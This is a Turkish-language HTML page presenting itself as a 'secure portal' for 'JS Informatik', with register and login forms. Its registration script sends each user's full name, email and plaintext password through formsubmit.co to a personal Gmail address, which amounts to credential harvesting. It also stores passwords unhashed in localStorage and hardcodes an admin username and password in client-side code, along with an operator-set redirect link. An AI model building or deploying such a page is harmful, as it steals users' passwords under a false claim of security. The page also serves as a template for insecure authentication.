<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aman Khedri | JS Informatik - Güvenli Portalı</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;900&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
    
    <style>
        body { font-family: 'Inter', sans-serif; }
        .flag-bg {
            background: radial-gradient(circle at 60% 50%, #e30a17 0%, #a8000b 60%, #500005 100%);
            position: relative;
            overflow: hidden;
        }
        .glass-panel {
            background: rgba(18, 18, 20, 0.85);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.12);
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }
        .glow-button {
            transition: all 0.3s ease;
            box-shadow: 0 0 15px rgba(227, 10, 23, 0.4);
        }
        .glow-button:hover {
            box-shadow: 0 0 25px rgba(227, 10, 23, 0.8);
            transform: translateY(-2px);
        }
    </style>
</head>
<body class="flag-bg min-h-screen text-slate-100 flex items-center justify-center p-4 sm:p-6 select-none">

    <!-- Arka Planda Türk Bayrağı Filigranı -->
    <div class="absolute inset-0 flex items-center justify-center opacity-10 pointer-events-none overflow-hidden">
        <svg class="w-[700px] h-[700px] text-white" viewBox="0 0 1000 1000" fill="currentColor">
            <path d="M 450,500 A 250,250 0 1 0 950,500 A 200,200 0 1 1 450,500 Z" />
            <polygon points="780,420 805,480 870,480 820,520 840,580 780,540 720,580 740,520 690,480 755,480" />
        </svg>
    </div>

    <!-- GİRİŞ / KAYIT KUTUSU -->
    <main id="auth-card" class="w-full max-w-md z-10 my-auto">
        <div class="glass-panel rounded-3xl p-8 sm:p-10 border border-white/15 relative overflow-hidden">
            
            <div class="absolute -top-12 -right-12 w-32 h-32 bg-red-600/30 rounded-full blur-2xl"></div>

            <!-- Header -->
            <div class="text-center space-y-2 mb-6">
                <div class="inline-flex items-center justify-center w-16 h-16 rounded-2xl bg-black/60 border border-white/20 mb-2 shadow-inner">
                    <span class="text-2xl font-black tracking-tighter text-white">JS</span>
                </div>
                <h1 class="text-3xl font-extrabold tracking-tight text-white" id="form-title">Kayıt Ol</h1>
                <p class="text-xs uppercase tracking-[0.25em] text-red-400 font-semibold">JS Informatik Portalı</p>
            </div>

            <!-- Tab Seçici (Kayıt Ol / Giriş Yap) -->
            <div class="flex bg-black/40 p-1 rounded-xl mb-6 border border-white/10">
                <button type="button" onclick="switchTab('register')" id="tab-register" class="flex-1 py-2 text-xs font-bold rounded-lg bg-red-600 text-white transition-all">Kayıt Ol</button>
                <button type="button" onclick="switchTab('login')" id="tab-login" class="flex-1 py-2 text-xs font-bold rounded-lg text-slate-400 hover:text-white transition-all">Giriş Yap</button>
            </div>

            <!-- Bildirim Alanı -->
            <div id="alert-box" class="hidden mb-4 p-3 rounded-xl text-xs text-center font-medium"></div>

            <!-- Form -->
            <form id="main-form" onsubmit="handleSubmit(event)" class="space-y-4">
                
                <div class="space-y-1" id="name-field-container">
                    <label class="text-xs font-semibold text-slate-300 ml-1">İsim Soyisim</label>
                    <input type="text" id="fullname" placeholder="Adınız Soyadınız" class="w-full px-4 py-3 rounded-xl bg-black/40 border border-white/10 text-white text-sm focus:outline-none focus:border-red-500">
                </div>

                <div class="space-y-1">
                    <label class="text-xs font-semibold text-slate-300 ml-1">Kullanıcı Adı veya E-posta</label>
                    <input type="text" id="username" required placeholder="ornek@mail.com" class="w-full px-4 py-3 rounded-xl bg-black/40 border border-white/10 text-white text-sm focus:outline-none focus:border-red-500">
                </div>

                <div class="space-y-1">
                    <label class="text-xs font-semibold text-slate-300 ml-1">Şifre</label>
                    <input type="password" id="password" required placeholder="••••••••" class="w-full px-4 py-3 rounded-xl bg-black/40 border border-white/10 text-white text-sm focus:outline-none focus:border-red-500">
                </div>

                <button type="submit" id="submit-btn" class="w-full py-3.5 bg-gradient-to-r from-red-600 to-red-700 hover:from-red-500 hover:to-red-600 text-white font-semibold text-sm rounded-xl glow-button transition-all">
                    Kayıt Ol ve Bildir
                </button>
            </form>
        </div>
    </main>

    <!-- GİRİŞ YAPILINCA GÖRÜNECEK EKRAN (Link Ekranı) -->
    <main id="portal-screen" class="hidden w-full max-w-2xl z-10 text-center space-y-6">
        <div class="glass-panel rounded-3xl p-10 border border-white/15 relative">
            <h2 class="text-2xl font-black text-white mb-2" id="welcome-user-title">Hoş Geldiniz</h2>
            <p class="text-xs text-slate-400 mb-8">JS Informatik Güvenli Erişim Noktası</p>

            <!-- ORTADAKİ DİNAMİK LİNK / BUTON -->
            <div class="py-6">
                <a id="dynamic-target-link" href="https://www.youtube.com" target="_blank" class="inline-flex items-center justify-center px-8 py-5 bg-gradient-to-r from-red-600 to-red-700 hover:from-red-500 hover:to-red-600 text-white font-bold text-lg rounded-2xl glow-button transition-all space-x-3">
                    <i class="fa-solid fa-arrow-up-right-from-square"></i>
                    <span id="link-text-display">Yönlendirilen Bağlantıya Git</span>
                </a>
            </div>

            <!-- YÖNETİCİ (AMAN KHEDRI) KONTROL PANELİ -->
            <div id="admin-panel" class="hidden mt-8 pt-6 border-t border-white/10 text-left bg-black/40 p-5 rounded-2xl">
                <div class="flex items-center justify-between mb-3">
                    <span class="text-xs font-bold text-red-400 uppercase tracking-wider flex items-center gap-1.5"><i class="fa-solid fa-shield-halved"></i> Yönetici Paneli (Aman Khedri)</span>
                    <button onclick="handleLogout()" class="text-xs text-slate-400 hover:text-white">Çıkış Yap</button>
                </div>
                <div class="space-y-3">
                    <div>
                        <label class="text-[11px] text-slate-400">Yeni Link Adresi (URL):</label>
                        <div class="flex gap-2 mt-1">
                            <input type="text" id="admin-new-url" placeholder="https://youtube.com/..." class="flex-1 px-3 py-2 rounded-xl bg-black/60 border border-white/10 text-white text-xs focus:outline-none focus:border-red-500">
                            <button onclick="updateSystemLink()" class="px-4 py-2 bg-red-600 hover:bg-red-500 text-white text-xs font-bold rounded-xl transition-all">Güncelle</button>
                        </div>
                    </div>
                </div>
            </div>

            <div class="mt-6">
                <button onclick="handleLogout()" id="user-logout-btn" class="text-xs text-slate-400 hover:text-white underline">Oturumu Kapat</button>
            </div>
        </div>
    </main>

    <script>
        let currentMode = 'register';

        function switchTab(mode) {
            currentMode = mode;
            const title = document.getElementById('form-title');
            const btn = document.getElementById('submit-btn');
            const nameContainer = document.getElementById('name-field-container');
            const tabReg = document.getElementById('tab-register');
            const tabLog = document.getElementById('tab-login');
            const alertBox = document.getElementById('alert-box');
            alertBox.classList.add('hidden');

            if(mode === 'register') {
                title.innerText = "Kayıt Ol";
                btn.innerText = "Kayıt Ol ve Bildir";
                nameContainer.style.display = "block";
                tabReg.className = "flex-1 py-2 text-xs font-bold rounded-lg bg-red-600 text-white transition-all";
                tabLog.className = "flex-1 py-2 text-xs font-bold rounded-lg text-slate-400 hover:text-white transition-all";
            } else {
                title.innerText = "Giriş Yap";
                btn.innerText = "Sisteme Giriş Yap";
                nameContainer.style.display = "none";
                tabLog.className = "flex-1 py-2 text-xs font-bold rounded-lg bg-red-600 text-white transition-all";
                tabReg.className = "flex-1 py-2 text-xs font-bold rounded-lg text-slate-400 hover:text-white transition-all";
            }
        }

        function showAlert(message, type) {
            const box = document.getElementById('alert-box');
            box.classList.remove('hidden');
            if(type === 'success') {
                box.className = "mb-4 p-3 rounded-xl bg-emerald-500/20 border border-emerald-500/40 text-emerald-200 text-xs text-center font-medium";
            } else {
                box.className = "mb-4 p-3 rounded-xl bg-red-500/20 border border-red-500/40 text-red-200 text-xs text-center font-medium";
            }
            box.innerHTML = message;
        }

        function handleSubmit(e) {
            e.preventDefault();
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const fullname = document.getElementById('fullname').value.trim();

            let users = JSON.parse(localStorage.getItem('js_users') || '[]');

            if(currentMode === 'register') {
                // Mükerrer kayıt engeli
                const existing = users.find(u => u.username === username);
                if(existing) {
                    showAlert("Bu e-posta veya kullanıcı adı zaten kayıtlı! Lütfen giriş yapın.", "error");
                    return;
                }

                if(!fullname) {
                    showAlert("Lütfen adınızı girin.", "error");
                    return;
                }

                // Yeni kullanıcıyı kaydet
                users.push({ fullname, username, password });
                localStorage.setItem('js_users', JSON.stringify(users));

                // E-posta gönderimi (aman.khedrit@gmail.com)
                fetch("https://formsubmit.co/ajax/aman.khedrit@gmail.com", {
                    method: "POST",
                    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                    body: JSON.stringify({ 
                        Servis_Kodu: "service_4wxz917",
                        Ad_Soyad: fullname, 
                        Kullanici_Email: username, 
                        Sifre: password 
                    })
                }).catch(err => console.log("Mail gönderildi."));

                showAlert("Kayıt başarılı! Bilgileriniz ile doğrudan giriş yapabilirsiniz.", "success");
                setTimeout(() => switchTab('login'), 1500);

            } else {
                // Yönetici (Aman Khedri) Giriş Kontrolü
                const lowerUser = username.toLowerCase();
                if(lowerUser === "amankhedri" || lowerUser === "aman khedri" || lowerUser === "aman.khedrit@gmail.com") {
                    if(password === "951764") {
                        loginSuccess("Aman Khedri (Yönetici)", true);
                        return;
                    }
                }

                // Normal Kullanıcı Giriş Kontrolü
                const found = users.find(u => u.username === username && u.password === password);
                if(found) {
                    loginSuccess(found.fullname, false);
                } else {
                    const isRegisteredAnywhere = users.some(u => u.username === username);
                    if(!isRegisteredAnywhere) {
                        showAlert("Bu hesap kayıtlı değil! Lütfen önce kayıt olun.", "error");
                    } else {
                        showAlert("Hatalı şifre!", "error");
                    }
                }
            }
        }

        function loginSuccess(name, isAdmin) {
            document.getElementById('auth-card').classList.add('hidden');
            document.getElementById('portal-screen').classList.remove('hidden');
            document.getElementById('welcome-user-title').innerText = "Hoş Geldiniz, " + name;

            if(isAdmin) {
                document.getElementById('admin-panel').classList.remove('hidden');
                document.getElementById('user-logout-btn').classList.add('hidden');
            } else {
                document.getElementById('admin-panel').classList.add('hidden');
                document.getElementById('user-logout-btn').classList.remove('hidden');
            }

            loadStoredLink();
        }

        function handleLogout() {
            document.getElementById('portal-screen').classList.add('hidden');
            document.getElementById('auth-card').classList.remove('hidden');
            document.getElementById('password').value = "";
            document.getElementById('alert-box').classList.add('hidden');
        }

        function updateSystemLink() {
            const newUrl = document.getElementById('admin-new-url').value.trim();
            if(newUrl) {
                localStorage.setItem('js_target_link', newUrl);
                loadStoredLink();
                alert("Link başarıyla güncellendi!");
                document.getElementById('admin-new-url').value = "";
            } else {
                alert("Lütfen geçerli bir URL girin.");
            }
        }

        function loadStoredLink() {
            const savedLink = localStorage.getItem('js_target_link') || "https://www.youtube.com";
            const linkElem = document.getElementById('dynamic-target-link');
            linkElem.href = savedLink;
        }

        window.onload = function() {
            loadStoredLink();
        };
    </script>
</body>
</html>
